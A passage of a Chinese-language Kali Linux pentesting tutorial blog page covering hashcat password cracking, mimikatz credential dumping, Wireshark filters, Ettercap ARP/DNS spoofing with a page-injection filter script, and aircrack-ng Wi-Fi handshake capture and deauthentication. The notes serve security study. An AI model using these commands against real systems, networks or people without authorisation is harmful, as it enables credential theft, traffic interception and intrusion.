+<p>​    下载地址：<a target="_blank" rel="noopener" href="https://hashcat.net/files/hashcat-5.1.0.7z">https://hashcat.net/files/hashcat-5.1.0.7z</a></p>
+<p>​    在渗透测试中我们往往会得到很多hash，需要去解密，而一些在线的网站无法解密出来所以我们就可以使用hash在本地进行密码恢复</p>
+<p>​    彩虹表：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bokun-wang/p/3887463.html">https://www.cnblogs.com/bokun-wang/p/3887463.html</a></p>
+<p>​            <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/732d9d960411">https://www.jianshu.com/p/732d9d960411</a></p>
+<p>——扫描模块</p>
+<p>​    # | Mode</p>
+<p> ===+======</p>
+<p> 0 | Straight（字典破解）：基于字典进行破解</p>
+<p> 1 | Combination（组合破解）：基于多个字典进行破解</p>
+<p> 3 | Brute-force（掩码暴力破解）：基于掩码设置进行破解</p>
+<p> 6 | Hybrid Wordlist + Mask（字典+掩码破解）</p>
+<p> 7 | Hybrid Mask + Wordlist（掩码+字典破解）</p>
+<p>——常见掩码设置</p>
+<p>​    ? | Charset</p>
+<p> ===+=========</p>
+<p> l | abcdefghijklmnopqrstuvwxyz [a-z]                纯小写字母</p>
+<p> u | ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]        纯大写字母</p>
+<p> d | 0123456789         [0-9]             纯数字</p>
+<p> h | 0123456789abcdef      [0-9a-f]          常见小写字母和数字</p>
+<p> H | 0123456789ABCDEF      [0-9A-F]        常见大写字母和数字</p>
+<p> s | !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~               特殊字符</p>
+<p> a | ?l?u?d?s                                      键盘上所有可见字符</p>
+<p> b | 0x00 - 0xff                         可能是用来匹配像空格这种密码的</p>
+<p>​    八位数字密码：?d?d?d?d?d?d?d?d</p>
+<p>​    八位未知密码：?a?a?a?a?a?a?a?a</p>
+<p>​    前四位为大写字母，后四位为数字：?u?u?u?u?d?d?d?d</p>
+<p>​    前四位是数字或者为小写字母，后四位是大写字母或者数字：?h?h?h?h?H?H?H?H</p>
+<p>​    前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a</p>
+<p>​    6-8位字母密码：–increment –increment-min 6 –increment-max 8 ?l?l?l?l?l?l?l?l</p>
+<p>​    6-8位数字+小写字母密码：–increment –increment-min 6 –increment-max 8 ?h?h?h?h?h?h?h?h</p>
+<p>——常用参数</p>
+<p>​    -a 指定要使用的破解模式，其值参考后面的参数。 “-a 0” 字典攻击， “-a 1” 组合攻击， “-a 3” 掩码攻击。</p>
+<p>​    -m 指定要破解的hash类型，如果不指定类型，则默认是MD5。</p>
+<p>​    -o 指定破解成功后的hash及所对应的明文密码的存放位置，可以用它把破解成功的hash写到指定的文件中。</p>
+<p>​    –force 忽略破解过程中的警告信息，跑单条hash可能需要加上此选项。</p>
+<p>​    –show 显示已经破解的hash所对应的明文</p>
+<p>​    –increment 启用增量破解模式，可以利用此模式让hashcat在指定的密码长度内执行破解过程</p>
+<p>​    –increment-min 密码最小长度，后面直接等于一个整数即可，配置increment模式一起使用。</p>
+<p>​    –increment-max   密码最大长度，同上</p>
+<p>​    –outfile-format    指定破解结果的输出格式id，默认是3</p>
+<p>——破解实例</p>
+<p>​    掩码破解</p>
+<p>\1.  数字破解（8位：12345678）</p>
+<p>hashcat -m 0 -a 3 <hash> ?d?d?d?d?d?d?d?d</p>
+<p>\2.  小写字母（6位：abcdef）</p>
+<p>hashcat -m 0 -a 3 <hash> ?l?l?l?l?l?l</p>
+<p>\3.  字母+数字（8位：1a31fa1c）</p>
+<p>hashcat -a 3 -m 0 –force <hash> –increment –increment-min 1 –increment-max 8 ?h?h?h?h?h?h?h?h</p>
+<p>——字典破解</p>
+<p>​    -a 0是指字典破解模式，-o是输出结果到文件中</p>
+<p>​    字典破解密码：</p>
+<p>hashcat -m 0 -a 0 ./dict/hash.txt ./dict/password.txt -o result.txt</p>
+<p>——破解实例</p>
+<p>\1.  破解windows hash</p>
+<p>使用mimikatz获取windows hash:需要管理员权限</p>
+<p>mimikatz log</p>
+<p>mimikatz # privilege::debug</p>
+<p>mimikatz # sekurlsa::logonpasswords</p>
+<p>mimikatz # exit</p>
+<p>NT-hash: hashcat -a 3 -m 1000 <hash> ?l?l?l?d?d?d?s</p>
+<p>\2.  zip压缩包破解</p>
+<p>使用zip2john获取哈希值</p>
+<p>设置hash类型：win-zip    扫描模式：掩码模式</p>
+<p>hashcat -m 13600 -a 3 <hash> ?d?d?d?d?d?d –show</p>
+<h1 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h1><h2 id="wireshark初步认识"><a href="#wireshark初步认识" class="headerlink" title="wireshark初步认识"></a>wireshark初步认识</h2><p>——简介</p>
+<p>​    它是世界上最流行的网络分析工具，这个强大的工具可以捕捉网络中的数据，并为用户提供关于网络和上层协议的各种信息。注：wireshark只能查看数据包，而不能修改数据包的内容，或者发送数据包。</p>
+<p>​    官网：<a target="_blank" rel="noopener" href="https://www.wireshark.org/">https://www.wireshark.org</a></p>
+<p>​    下载地址：<a target="_blank" rel="noopener" href="https://www.wireshark.org/#download">https://www.wireshark.org/#download</a></p>
+<p>​    Wiki：<a target="_blank" rel="noopener" href="https://wiki.wireshark.org/">https://wiki.wireshark.org/</a></p>
+<p>​    可以通过wireshark进行分析网络进程的数据包。</p>
+<p>——初步使用</p>
+<p>​    比较运算符和逻辑运算符</p>
+<p>​    comparison operators（比较运算符）：可以使用6种比较运算符：</p>
+<p>​    英文写法      C语言写法        含义</p>
+<p>​    eq            ==               等于</p>
+<p>​    ne            !=                不等于</p>
+<p>​    gt             &gt;                大于</p>
+<p>​    lt             &lt;                小于</p>
+<p>​    ge            &gt;=               大于等于</p>
+<p>​    le             &lt;=               小于等于</p>
+<p>​    logical expressions（逻辑运算符）</p>
+<p>​    英文写法      C语言写法        含义</p>
+<p>​    and           &amp;&amp;               逻辑与</p>
+<p>​    or             ||                 逻辑或</p>
+<p>​    xor            ^^               逻辑异或</p>
+<p>​    not           !                 逻辑非</p>
+<p>——常见的过滤器</p>
+<p>\1.  协议过滤</p>
+<p>http.request.method == “POST” or icmp.type   显示post请求的数据包或icmp协议的数据包</p>
+<p>​       ip.addr == 192.168.x.xx 显示ip地址192.168.x.xx相关的数据包</p>
+<p>​       ip.src == 10.230.0.0/16  显示来自该网址网段的数据包</p>
+<p>​       http.host == “192.168.x.xx” 显示该主机相关的数据包</p>
+<p>​       tcp.port == 25  显示来源或目的的tcp端口号位25的数据包</p>
+<p>​       tcp.dstport == 25   显示目的TCP端口号为25的数据包</p>
+<p>​       http.response.code == 302  显示http响应状态码为302的数据包</p>
+<p>\2.  内容过滤</p>
+<p>contains: Does the protocol, field or slice contain a value</p>
+<p>tcp contains “http”  显示包含http字符串的tcp数据包</p>
+<p>http.host contains “192.168.x.xx” 显示包含该主机的数据包</p>
+<p>——MSF嗅探数据包分析</p>
+<p>\1.  通过分析存在nginx解析漏洞，通过上传图片马得到webshell。</p>
+<p>\2.  生成MSF后门上传到对方服务器并执行，获取system权限。</p>
+<p>\3.  开启嗅探并导出文件</p>
+<p>load sniffer     sniffer_interfaces   sniffer_start 2   sniffer_stop 2</p>
+<p>sniffer_dump 2 22.pc.ap</p>
+<p>\4.  wireshark分析数据包，通过获取的数据包分析到对方明文传输密码</p>
+<p>——WSExplorer分析</p>
+<p>​    对软件进程数据包进行分析</p>
+<h2 id="DNS劫持-Ettercap"><a href="#DNS劫持-Ettercap" class="headerlink" title="DNS劫持-Ettercap"></a>DNS劫持-Ettercap</h2><p>——ARP协议简介</p>
+<p>​    ARP（Address Resolution Protocol）即地址解析协议，用于实现从IP地址到MAC地址的映射，即询问目标ip对应的MAC地址。</p>
+<p>​    我们能够通过修改mac地址来达到中间人拦截、局域网流控、流量欺骗等情况。</p>
+<p>——ettercap简介</p>
+<p>​    Ettercap是一个综合性的中间人攻击工具，使用它可以进行ARP欺骗、拦截器、DNS欺骗等常见的中间人攻击。</p>
+<p>​    特点：图形化、命令行</p>
+<p>​    官网：<a target="_blank" rel="noopener" href="http://www.ettercap-project.org/">http://www.ettercap-project.org/</a></p>
+<p>​    插件：<a target="_blank" rel="noopener" href="https://linux.die.net/man/8/ettercap_plugins">https://linux.die.net/man/8/ettercap_plugins</a></p>
+<p>​    过滤器：<a target="_blank" rel="noopener" href="https://linux.die.net/man/8/etterfilter">https://linux.die.net/man/8/etterfilter</a></p>
+<p>——Ettercap常用命令</p>
+<p>\1.  用户界面类型</p>
+<p>-T, -text    使用只显示字符的界面</p>
+<p>-q, -quiet   安静模式，不显示抓到的数据包内容</p>
+<p>-G, -gtk    使用GTK+GUI，开启图形化模式</p>
+<p>​    \2. 日志选项</p>
+<p>​       -w, -write <file>    将嗅探到的数据写入pcap文件<file></p>
+<p>​       -L, -log <logfile>   此处记录所有流量<logfile></p>
+<p>​    \3. 通用选项</p>
+<p>​       -i, -iface <iface>   使用该网络接口</p>
+<p>​       -l, -liface          显示所有的网络接口</p>
+<p>​       -P, -plugin <plugin>   开始该插件</p>
+<p>​       -F, -filter <file>    加载过滤器<file> （内容过滤）</p>
+<p>​    \4. 嗅探与攻击选项</p>
+<p>​       -M, mitm（方法：ARGS）  执行mitm攻击</p>
+<p>——Ettercap案例</p>
+<p>​    —ettercap开启dns欺骗</p>
+<p>\1.  开启apache服务</p>
+<p>编辑html文件：leafpad /var/www/html/</p>
+<p>service apache2 start</p>
+<p>\2.  编辑ettercap配置文件</p>
+<p>leafpad /etc/Ettercap/etter.dns</p>
+<p>\3.  Ettercap使用图形化</p>
+<p>Ettercap -G</p>
+<p>\4.  命令行测试</p>
+<p>Ettercap -qT -i eth0 -M arp:remote -w 1.pcap /192.168.x.xx//192.168.xx.xxx/</p>
+<p>—ettercap替换网页内容-钓鱼</p>
+<p>\1.  准备过滤器脚本</p>
+<p>官方示例脚本：/usr/share/Ettercap/etter filter.examples</p>
+<p>\2.  编译脚本</p>
+<p>etterfilter head.filter -o head.ef      //head.filter为脚本</p>
+<p>\3.  受害者访问http网站</p>
+<p>—过滤器脚本</p>
+<p> if (ip.proto == TCP &amp;&amp; tcp.dst == 80) {</p>
+<p>​    if (search(DATA.data, “Accept-Encoding”)) {</p>
+<p>​              replace(“Accept-Encoding”, “Accept-Nothing”);</p>
+<p>}</p>
+<p>}</p>
+<p>if (ip.proto == TCP &amp;&amp; tcp.src == 80) {</p>
+<p>​    if (search(DATA.data, “<head>”)) {</p>
+<p>​    replace(“<head>”, “<head><script>alert(‘2333’)</script>”);</p>
+<p>​    msg(“inject head”);</p>
+<p>}</p>
+<p>}</p>
+<p>该过滤脚本的作用是在http网站中替换<head>内容。</p>
+<h1 id="无线破解"><a href="#无线破解" class="headerlink" title="无线破解"></a>无线破解</h1><h2 id="无线WIFI破解"><a href="#无线WIFI破解" class="headerlink" title="无线WIFI破解"></a>无线WIFI破解</h2><p>——aircrack-ng简介</p>
+<p>​    它是一个与802.11标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解。Aircrack-ng可以工作在任何支持监听模式的无线网卡上并嗅探802.11a, 802.11b, 802.11g的数据。该程序可运行在linux和windows上。</p>
+<p>​    开源项目：<a target="_blank" rel="noopener" href="https://github.com/aircrack-ng/aircrack-ng">https://github.com/aircrack-ng/aircrack-ng</a></p>
+<p>​    官网：<a target="_blank" rel="noopener" href="https://www.aircrack-ng.org/">https://www.aircrack-ng.org/</a></p>
+<p>​    教程：<a target="_blank" rel="noopener" href="https://www.aircrack-ng.org/~~V/doku.php?id=tutorial">https://www.aircrack-ng.org/~~V/doku.php?id=tutorial</a></p>
+<p>——破解流程</p>
+<p>\1.  查看网卡设备</p>
+<p>命令：ifconfig/iwconfig</p>
+<p>\2.  查看是否支持监听模式</p>
+<p>命令：airmon-ng</p>
+<p>\3.  开启无线网卡监听模式</p>
+<p>airmon-ng start wlan0</p>
+<p>\4.  查看周围WIFI网络</p>
+<p>airodump-ng wlan0mon</p>
+<p>\5.  监听目标网络的握手包</p>
+<p>airodump-ng -c 11 –bssid 2C:57:31:60:27:E6 -w ~/1/ wlan0mon</p>
+<p>参数解释：</p>
+<p>-c 指定频道号</p>
+<p>-bssid 指定路由器bssid</p>
+<p>-w 指定抓取的数据包保存位置</p>
+<p>​    \6. 强制对方WIFI断开重连（获取握手包）</p>
+<p>​       aireplay-ng -0 2 -a 2C:57:31:60:27:E6 -c 60AB:67:F2:F5:A8 wlan0mon</p>
+<p>​       参数解释：-0 表示发起（鉴权）deauthentication攻击</p>
+<p>​                  -a 指定无线路由器BSSID</p>
+<p>​                  -c 指定强制断开的设备</p>
+<p>​    \7. 破解握手包密码</p>
+<p>​       aircrack-ng -a2 -b 52:8F:4C:67:B1:91 -w pass.txt ~/-01/*.cap</p>
+<p>​       参数解释：-a2 代表WPA的握手包</p>
+<p>​                  -b 指定要破解的wifi BSSID</p>
+<p>​                  -w 指定字典文件</p>
+<p>​                  最后是抓取的包</p>
+<p>​    \8. 关闭监听模式</p>
+<p>​       airmon-ng stop wlanmon</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/kali/" rel="tag"># kali</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/08/17/python%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E5%BC%80%E5%8F%91/" rel="prev" title="python图形界面开发">
+      <i class="fa fa-chevron-left"></i> python图形界面开发
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/08/17/python%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/" rel="next" title="python数据库操作">
+      python数据库操作 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#kali-Linux-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85"><span class="nav-number">1.</span> <span class="nav-text">kali Linux_环境安装</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Kali-%E7%B3%BB%E7%BB%9F%E6%9B%B4%E6%96%B0"><span class="nav-number">1.1.</span> <span class="nav-text">Kali****系统更新</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSH-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1"><span class="nav-number">1.2.</span> <span class="nav-text">SSH****系统服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kali-%E5%B7%A5%E5%85%B7%E5%8C%85%E7%AE%80%E4%BB%8B"><span class="nav-number">1.3.</span> <span class="nav-text">Kali****工具包简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFshell"><span class="nav-number">1.4.</span> <span class="nav-text">什么是shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vim-%E7%BC%96%E8%BE%91%E5%99%A8"><span class="nav-number">1.5.</span> <span class="nav-text">vim****编辑器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">1.6.</span> <span class="nav-text">Linux****常用命令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BB%80%E4%B9%88"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%83%BD%E5%B9%B2%E5%98%9B"><span class="nav-number">2.2.</span> <span class="nav-text">信息收集能干嘛</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%A5%E5%91%8A%E7%BC%96%E5%86%99"><span class="nav-number">2.3.</span> <span class="nav-text">信息收集报告编写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95Google-hacking"><span class="nav-number">2.4.</span> <span class="nav-text">谷歌语法Google hacking</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="nav-number">2.5.</span> <span class="nav-text">网络空间搜索引擎</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-Nmap"><span class="nav-number">2.6.</span> <span class="nav-text">端口扫描-Nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D-amp-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">2.7.</span> <span class="nav-text">子域名&amp;目录扫描</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">Web利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7"><span class="nav-number">3.1.</span> <span class="nav-text">Web漏洞扫描工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8-AppScan"><span class="nav-number">3.2.</span> <span class="nav-text">WEB漏洞扫描器-AppScan</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8-Burp-suite%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95"><span class="nav-number">3.3.</span> <span class="nav-text">WEB漏洞扫描器-Burp suite常规测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Burpsuite-%E6%8F%92%E4%BB%B6%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B"><span class="nav-number">3.4.</span> <span class="nav-text">Burpsuite-插件利用检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0"><span class="nav-number">3.5.</span> <span class="nav-text">xss漏洞初步学习</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#beef-XSS"><span class="nav-number">3.6.</span> <span class="nav-text">beef-XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%A9%E7%94%A8"><span class="nav-number">3.7.</span> <span class="nav-text">sqlmap之sql注入原理利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%E4%B8%80"><span class="nav-number">3.8.</span> <span class="nav-text">sqlmap之sql注入一</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81SQLMAP%E7%94%A8%E4%BA%8EAccess%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">一、SQLMAP用于Access数据库注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81SQLMAP%E7%94%A8%E4%BA%8ECookie%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">二、SQLMAP用于Cookie注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81SQLMAP%E7%94%A8%E4%BA%8Emysql%E4%B8%ADDDOS%E6%94%BB%E5%87%BB"><span class="nav-number">6.</span> <span class="nav-text">三、SQLMAP用于mysql中DDOS攻击</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81SQLMAP%E7%94%A8%E4%BA%8Emysql%E6%B3%A8%E5%85%A5"><span class="nav-number">7.</span> <span class="nav-text">四、SQLMAP用于mysql注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%94%E3%80%81SQLMAP%E4%B8%ADpost%E7%99%BB%E9%99%86%E6%A1%86%E6%B3%A8%E5%85%A5"><span class="nav-number">8.</span> <span class="nav-text">五、SQLMAP中post登陆框注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%AD%E3%80%81SQLMAP%E4%B8%ADGoogle%E6%90%9C%E7%B4%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">9.</span> <span class="nav-text">六、SQLMAP中Google搜索注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%83%E3%80%81SQLMAP%E4%B8%AD%E7%9A%84%E8%AF%B7%E6%B1%82%E5%BB%B6%E8%BF%9F"><span class="nav-number">10.</span> <span class="nav-text">七、SQLMAP中的请求延迟</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%AB%E3%80%81SQLMAP%E7%BB%95%E8%BF%87WAF%E9%98%B2%E7%81%AB%E5%A2%99"><span class="nav-number">11.</span> <span class="nav-text">八、SQLMAP绕过WAF防火墙</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B9%9D%E3%80%81SQLMAP%E6%9F%A5%E7%9C%8B%E6%9D%83%E9%99%90"><span class="nav-number">12.</span> <span class="nav-text">九、SQLMAP查看权限</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8D%81%E3%80%81SQLMAP%E4%BC%AA%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5-1-%E6%9F%A5%E6%89%BE%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">13.</span> <span class="nav-text">十、SQLMAP伪静态注入(1) 查找数据库</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81SQLMAP%E6%B3%A8%E5%85%A5%E7%82%B9%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E4%BA%A4%E4%BA%92%E5%86%99shell"><span class="nav-number">14.</span> <span class="nav-text">十一、SQLMAP注入点执行命令与交互写shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%E4%BA%8C"><span class="nav-number">14.1.</span> <span class="nav-text">sqlmap之sql注入二</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7"><span class="nav-number">14.2.</span> <span class="nav-text">Webshell管理工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-shell-Weevely"><span class="nav-number">14.3.</span> <span class="nav-text">Linux shell Weevely</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">15.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Metasploit%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="nav-number">15.1.</span> <span class="nav-text">Metasploit框架与基本命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSF-%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97"><span class="nav-number">15.2.</span> <span class="nav-text">MSF-扫描模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSF%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97"><span class="nav-number">15.3.</span> <span class="nav-text">MSF密码爆破模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSF-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="nav-number">15.4.</span> <span class="nav-text">MSF-漏洞利用模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSF%E6%8B%BF%E5%88%B0shell%E5%90%8E%E6%8F%90%E6%9D%83"><span class="nav-number">15.5.</span> <span class="nav-text">MSF拿到shell后提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSF-%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E6%A8%A1%E5%9D%97"><span class="nav-number">15.6.</span> <span class="nav-text">MSF-后门生成模块</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="nav-number">16.</span> <span class="nav-text">密码破解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-Hashcat"><span class="nav-number">16.1.</span> <span class="nav-text">密码破解-Hashcat</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%97%85%E6%8E%A2"><span class="nav-number">17.</span> <span class="nav-text">嗅探</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#wireshark%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86"><span class="nav-number">17.1.</span> <span class="nav-text">wireshark初步认识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E5%8A%AB%E6%8C%81-Ettercap"><span class="nav-number">17.2.</span> <span class="nav-text">DNS劫持-Ettercap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3"><span class="nav-number">18.</span> <span class="nav-text">无线破解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E7%BA%BFWIFI%E7%A0%B4%E8%A7%A3"><span class="nav-number">18.1.</span> <span class="nav-text">无线WIFI破解</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
